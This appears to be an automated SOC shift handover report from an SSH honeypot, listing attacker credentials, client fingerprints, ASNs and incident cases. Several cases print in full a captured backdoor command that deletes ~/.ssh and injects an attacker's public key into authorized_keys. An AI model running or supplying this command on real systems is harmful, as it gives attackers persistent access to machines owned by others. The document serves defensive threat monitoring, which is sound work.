# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-04-04 |
| **Generated At** | 2026-04-04T12:51:36Z |
| **Shift Time** | 12:51 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **98** |
| Confirmed Threats | **66** |
| False Positives Filtered | **32** (32.6%) |
| Unique Attacker IPs | **48** |
| Countries of Origin | **22** |
| High Severity Cases | **15** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **83** |
| Malware Samples Analyzed | **0** HIGH · **14** MED · 2 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **48** |
| Unique Credential Pairs | **35** |
| Unique Usernames | **23** |
| Unique Passwords | **34** |
| Successful Auth Pairs | **14** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 15 |
| `345gs5662d34` | 7 |
| `pi` | 2 |
| `default` | 2 |
| `admin` | 2 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 7 |
| `3245gs5662d34` | 7 |
| `qwerty` | 2 |
| `admin` | 2 |
| `123qwe` | 1 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 7 |
| `root` | `3245gs5662d34` | 7 |
| `admin` | `admin` | 2 |
| `ubuntu` | `123qwe` | 1 |
| `Support` | `dietpi` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `Qazwsx8888@@` | `118.219.239.123` | 2026-04-04T11:14:44 |
| `root` | `3245gs5662d34` | `118.219.239.123` | 2026-04-04T11:14:47 |
| `root` | `qwer123qwer` | `185.158.22.150` | 2026-04-04T11:17:20 |
| `root` | `3245gs5662d34` | `185.158.22.150` | 2026-04-04T11:17:25 |
| `root` | `Admin@123` | `103.13.206.122` | 2026-04-04T11:18:17 |
| `root` | `3245gs5662d34` | `103.13.206.122` | 2026-04-04T11:18:20 |
| `root` | `Root123123!!` | `186.251.71.202` | 2026-04-04T11:29:02 |
| `root` | `3245gs5662d34` | `186.251.71.202` | 2026-04-04T11:29:09 |
| `root` | `centos` | `112.91.141.244` | 2026-04-04T11:53:04 |
| `root` | `XXcc123123` | `165.227.119.154` | 2026-04-04T12:21:47 |
| `root` | `3245gs5662d34` | `165.227.119.154` | 2026-04-04T12:21:52 |
| `root` | `999` | `156.236.75.188` | 2026-04-04T12:27:46 |
| `root` | `3245gs5662d34` | `156.236.75.188` | 2026-04-04T12:27:50 |
| `root` | `asdf!234` | `156.236.75.188` | 2026-04-04T12:30:12 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **98** |
| Sessions with Fingerprint | **5** |
| Unique HASSH Fingerprints | **5** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 27 |
| OpenSSH | 17 |
| AsyncSSH (Python) | 5 |
| Go SSH scanner | 1 |
| Unknown | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `03a80b21afa8...` | Modern SSH client | 27 | 10 |
| `acaa53e0a7d7...` | Mirai/variant | 17 | 17 |
| `fda360b1b4f4...` | Mirai/variant | 5 | 1 |
| `98ddc5604ef6...` | Modern SSH client | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `03a80b21afa8...` | libssh | 27 | 10 | Modern SSH client |
| `acaa53e0a7d7...` | OpenSSH | 17 | 17 | Mirai/variant |
| `fda360b1b4f4...` | AsyncSSH (Python) | 5 | 1 | Mirai/variant |
| `98ddc5604ef6...` | Go SSH scanner | 1 | 1 | Modern SSH client |
| `95420f9d932d...` | Unknown | 1 | 1 | — |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **1** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 7 | 6 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `156.236.75.188`, `185.158.22.150`, `186.251.71.202`, `118.219.239.123`, `103.13.206.122`, `165.227.119.154`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **48** |
| Unique ASNs | **39** |
| High-Risk ASNs | **33** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS38365` | Beijing Baidu Netcom Science and Technology Co., Ltd. | 3 | HIGH |
| `AS4134` | CHINANET-BACKBONE | 3 | HIGH |
| `AS25159` | PJSC MegaFon | 2 | HIGH |
| `AS46562` | Performive LLC | 2 | MEDIUM |
| `AS3462` | Data Communication Business Group | 2 | HIGH |
| `AS24835` | Vodafone Data | 2 | HIGH |
| `AS22773` | Cox Communications Inc. | 2 | MEDIUM |
| `AS9318` | SK Broadband Co Ltd | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (15)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-a759578dff37

| Field | Detail |
|---|---|
| **Source IP** | `118.219.239[.]123` |
| **First Seen** | 2026-04-04 11:14 |
| **Last Seen** | 2026-04-04 11:14 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-04 11:14:43` | `cowrie.session.connect` |
| `2026-04-04 11:14:43` | `cowrie.client.version` |
| `2026-04-04 11:14:43` | `cowrie.client.kex` |
| `2026-04-04 11:14:44` | `cowrie.login.success` |
| `2026-04-04 11:14:44` | `cowrie.session.params` |
| `2026-04-04 11:14:44` | `cowrie.command.input` |
| `2026-04-04 11:14:44` | `cowrie.command.failed` |
| `2026-04-04 11:14:44` | `cowrie.log.closed` |
| `2026-04-04 11:14:44` | `cowrie.session.params` |
| `2026-04-04 11:14:44` | `cowrie.command.input` |
| `2026-04-04 11:14:45` | `cowrie.session.file_download` |
| `2026-04-04 11:14:45` | `cowrie.log.closed` |
| `2026-04-04 11:14:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.219.239[.]123` to AbuseIPDB if not already reported
- [ ] Block `118.219.239[.]123` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a5f866addd9f

| Field | Detail |
|---|---|
| **Source IP** | `118.219.239[.]123` |
| **First Seen** | 2026-04-04 11:14 |
| **Last Seen** | 2026-04-04 11:14 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-04 11:14:47` | `cowrie.session.connect` |
| `2026-04-04 11:14:47` | `cowrie.client.version` |
| `2026-04-04 11:14:47` | `cowrie.client.kex` |
| `2026-04-04 11:14:47` | `cowrie.login.success` |
| `2026-04-04 11:14:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.219.239[.]123` to AbuseIPDB if not already reported
- [ ] Block `118.219.239[.]123` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f3acc86719bd

| Field | Detail |
|---|---|
| **Source IP** | `185.158.22[.]150` |
| **First Seen** | 2026-04-04 11:17 |
| **Last Seen** | 2026-04-04 11:17 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-04 11:17:19` | `cowrie.session.connect` |
| `2026-04-04 11:17:19` | `cowrie.client.version` |
| `2026-04-04 11:17:19` | `cowrie.client.kex` |
| `2026-04-04 11:17:20` | `cowrie.login.success` |
| `2026-04-04 11:17:21` | `cowrie.session.params` |
| `2026-04-04 11:17:21` | `cowrie.command.input` |
| `2026-04-04 11:17:21` | `cowrie.command.failed` |
| `2026-04-04 11:17:21` | `cowrie.log.closed` |
| `2026-04-04 11:17:21` | `cowrie.session.params` |
| `2026-04-04 11:17:21` | `cowrie.command.input` |
| `2026-04-04 11:17:21` | `cowrie.session.file_download` |
| `2026-04-04 11:17:21` | `cowrie.log.closed` |
| `2026-04-04 11:17:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.158.22[.]150` to AbuseIPDB if not already reported
- [ ] Block `185.158.22[.]150` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fc3870d52ad1

| Field | Detail |
|---|---|
| **Source IP** | `185.158.22[.]150` |
| **First Seen** | 2026-04-04 11:17 |
| **Last Seen** | 2026-04-04 11:17 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-04 11:17:24` | `cowrie.session.connect` |
| `2026-04-04 11:17:24` | `cowrie.client.version` |
| `2026-04-04 11:17:24` | `cowrie.client.kex` |
| `2026-04-04 11:17:25` | `cowrie.login.success` |
| `2026-04-04 11:17:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.158.22[.]150` to AbuseIPDB if not already reported
- [ ] Block `185.158.22[.]150` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6e0c471e93b8

| Field | Detail |
|---|---|
| **Source IP** | `103.13.206[.]122` |
| **First Seen** | 2026-04-04 11:18 |
| **Last Seen** | 2026-04-04 11:18 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-04 11:18:17` | `cowrie.session.connect` |
| `2026-04-04 11:18:17` | `cowrie.client.version` |
| `2026-04-04 11:18:17` | `cowrie.client.kex` |
| `2026-04-04 11:18:17` | `cowrie.login.success` |
| `2026-04-04 11:18:17` | `cowrie.session.params` |
| `2026-04-04 11:18:17` | `cowrie.command.input` |
| `2026-04-04 11:18:17` | `cowrie.command.failed` |
| `2026-04-04 11:18:18` | `cowrie.log.closed` |
| `2026-04-04 11:18:18` | `cowrie.session.params` |
| `2026-04-04 11:18:18` | `cowrie.command.input` |
| `2026-04-04 11:18:18` | `cowrie.session.file_download` |
| `2026-04-04 11:18:18` | `cowrie.log.closed` |
| `2026-04-04 11:18:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.13.206[.]122` to AbuseIPDB if not already reported
- [ ] Block `103.13.206[.]122` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-caf9414f73ac

| Field | Detail |
|---|---|
| **Source IP** | `103.13.206[.]122` |
| **First Seen** | 2026-04-04 11:18 |
| **Last Seen** | 2026-04-04 11:18 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-04 11:18:19` | `cowrie.session.connect` |
| `2026-04-04 11:18:19` | `cowrie.client.version` |
| `2026-04-04 11:18:19` | `cowrie.client.kex` |
| `2026-04-04 11:18:20` | `cowrie.login.success` |
| `2026-04-04 11:18:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.13.206[.]122` to AbuseIPDB if not already reported
- [ ] Block `103.13.206[.]122` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ff24a29196a6

| Field | Detail |
|---|---|
| **Source IP** | `186.251.71[.]202` |
| **First Seen** | 2026-04-04 11:29 |
| **Last Seen** | 2026-04-04 11:29 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-04 11:29:00` | `cowrie.session.connect` |
| `2026-04-04 11:29:00` | `cowrie.client.version` |
| `2026-04-04 11:29:00` | `cowrie.client.kex` |
| `2026-04-04 11:29:02` | `cowrie.login.success` |
| `2026-04-04 11:29:02` | `cowrie.session.params` |
| `2026-04-04 11:29:02` | `cowrie.command.input` |
| `2026-04-04 11:29:02` | `cowrie.command.failed` |
| `2026-04-04 11:29:03` | `cowrie.log.closed` |
| `2026-04-04 11:29:04` | `cowrie.session.params` |
| `2026-04-04 11:29:04` | `cowrie.command.input` |
| `2026-04-04 11:29:04` | `cowrie.session.file_download` |
| `2026-04-04 11:29:04` | `cowrie.log.closed` |
| `2026-04-04 11:29:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.251.71[.]202` to AbuseIPDB if not already reported
- [ ] Block `186.251.71[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e7541341f9c8

| Field | Detail |
|---|---|
| **Source IP** | `186.251.71[.]202` |
| **First Seen** | 2026-04-04 11:29 |
| **Last Seen** | 2026-04-04 11:29 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-04 11:29:08` | `cowrie.session.connect` |
| `2026-04-04 11:29:08` | `cowrie.client.version` |
| `2026-04-04 11:29:08` | `cowrie.client.kex` |
| `2026-04-04 11:29:09` | `cowrie.login.success` |
| `2026-04-04 11:29:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.251.71[.]202` to AbuseIPDB if not already reported
- [ ] Block `186.251.71[.]202` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9b98ae7f85f1

| Field | Detail |
|---|---|
| **Source IP** | `112.91.141[.]244` |
| **First Seen** | 2026-04-04 11:53 |
| **Last Seen** | 2026-04-04 11:58 |
| **Session Duration** | 303s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-04 11:53:00` | `cowrie.session.connect` |
| `2026-04-04 11:53:03` | `cowrie.client.version` |
| `2026-04-04 11:53:03` | `cowrie.client.kex` |
| `2026-04-04 11:53:04` | `cowrie.login.success` |
| `2026-04-04 11:58:04` | `cowrie.session.file_upload` |
| `2026-04-04 11:58:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.91.141[.]244` to AbuseIPDB if not already reported
- [ ] Block `112.91.141[.]244` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7b2cd4fb91dc

| Field | Detail |
|---|---|
| **Source IP** | `165.227.119[.]154` |
| **First Seen** | 2026-04-04 12:21 |
| **Last Seen** | 2026-04-04 12:21 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-04 12:21:46` | `cowrie.session.connect` |
| `2026-04-04 12:21:46` | `cowrie.client.version` |
| `2026-04-04 12:21:46` | `cowrie.client.kex` |
| `2026-04-04 12:21:47` | `cowrie.login.success` |
| `2026-04-04 12:21:48` | `cowrie.session.params` |
| `2026-04-04 12:21:48` | `cowrie.command.input` |
| `2026-04-04 12:21:48` | `cowrie.command.failed` |
| `2026-04-04 12:21:48` | `cowrie.log.closed` |
| `2026-04-04 12:21:48` | `cowrie.session.params` |
| `2026-04-04 12:21:48` | `cowrie.command.input` |
| `2026-04-04 12:21:48` | `cowrie.session.file_download` |
| `2026-04-04 12:21:48` | `cowrie.log.closed` |
| `2026-04-04 12:21:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.227.119[.]154` to AbuseIPDB if not already reported
- [ ] Block `165.227.119[.]154` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cbc0fee54ec7

| Field | Detail |
|---|---|
| **Source IP** | `165.227.119[.]154` |
| **First Seen** | 2026-04-04 12:21 |
| **Last Seen** | 2026-04-04 12:21 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-04 12:21:51` | `cowrie.session.connect` |
| `2026-04-04 12:21:51` | `cowrie.client.version` |
| `2026-04-04 12:21:51` | `cowrie.client.kex` |
| `2026-04-04 12:21:52` | `cowrie.login.success` |
| `2026-04-04 12:21:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.227.119[.]154` to AbuseIPDB if not already reported
- [ ] Block `165.227.119[.]154` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0edeb6164250

| Field | Detail |
|---|---|
| **Source IP** | `156.236.75[.]188` |
| **First Seen** | 2026-04-04 12:27 |
| **Last Seen** | 2026-04-04 12:27 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-04 12:27:45` | `cowrie.session.connect` |
| `2026-04-04 12:27:45` | `cowrie.client.version` |
| `2026-04-04 12:27:45` | `cowrie.client.kex` |
| `2026-04-04 12:27:46` | `cowrie.login.success` |
| `2026-04-04 12:27:46` | `cowrie.session.params` |
| `2026-04-04 12:27:46` | `cowrie.command.input` |
| `2026-04-04 12:27:46` | `cowrie.command.failed` |
| `2026-04-04 12:27:46` | `cowrie.log.closed` |
| `2026-04-04 12:27:47` | `cowrie.session.params` |
| `2026-04-04 12:27:47` | `cowrie.command.input` |
| `2026-04-04 12:27:47` | `cowrie.session.file_download` |
| `2026-04-04 12:27:47` | `cowrie.log.closed` |
| `2026-04-04 12:27:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `156.236.75[.]188` to AbuseIPDB if not already reported
- [ ] Block `156.236.75[.]188` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-442850ca8f51

| Field | Detail |
|---|---|
| **Source IP** | `156.236.75[.]188` |
| **First Seen** | 2026-04-04 12:27 |
| **Last Seen** | 2026-04-04 12:27 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-04 12:27:49` | `cowrie.session.connect` |
| `2026-04-04 12:27:49` | `cowrie.client.version` |
| `2026-04-04 12:27:49` | `cowrie.client.kex` |
| `2026-04-04 12:27:50` | `cowrie.login.success` |
| `2026-04-04 12:27:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `156.236.75[.]188` to AbuseIPDB if not already reported
- [ ] Block `156.236.75[.]188` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c28b0eef05bc

| Field | Detail |
|---|---|
| **Source IP** | `156.236.75[.]188` |
| **First Seen** | 2026-04-04 12:30 |
| **Last Seen** | 2026-04-04 12:30 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
